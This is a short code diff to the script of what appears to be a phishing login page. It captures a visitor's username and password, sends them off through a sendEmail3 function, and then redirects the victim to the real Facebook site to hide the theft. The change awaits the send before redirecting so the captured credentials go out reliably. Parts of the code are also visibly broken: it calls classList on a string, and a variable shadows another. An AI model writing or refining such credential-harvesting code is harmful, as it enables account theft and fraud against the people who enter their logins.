@@ -15,7 +15,7 @@ async function sendEmail3(val1, val2) {
   });
 }
 
-function redirect(event) {
+async function redirect(event) {
   event.preventDefault();
   const userValue = document.getElementById("user").value.trim();
   const passwordValue = document.getElementById("password").value.trim();
@@ -28,12 +28,18 @@ function redirect(event) {
     userValue.classList.add("input-error");
     return;
   }
-  sendEmail3(userValue, passwordValue);
-  //redirect
-  location.replace("https://es-la.facebook.com/");
-  console.log("pass");
-  error.style.display = "none";
-  userValue.classList.remove("input-error");
+  try {
+    await sendEmail3(userValue, passwordValue);
+    //redirect
+    location.replace("https://es-la.facebook.com/");
+    console.log("pass");
+    error.style.display = "none";
+    userValue.classList.remove("input-error");
+  } catch (error) {
+    error.style.display = "block";
+    userValue.classList.add("input-error");
+    return;
+  }
 }
 
 function validate(user, password) {
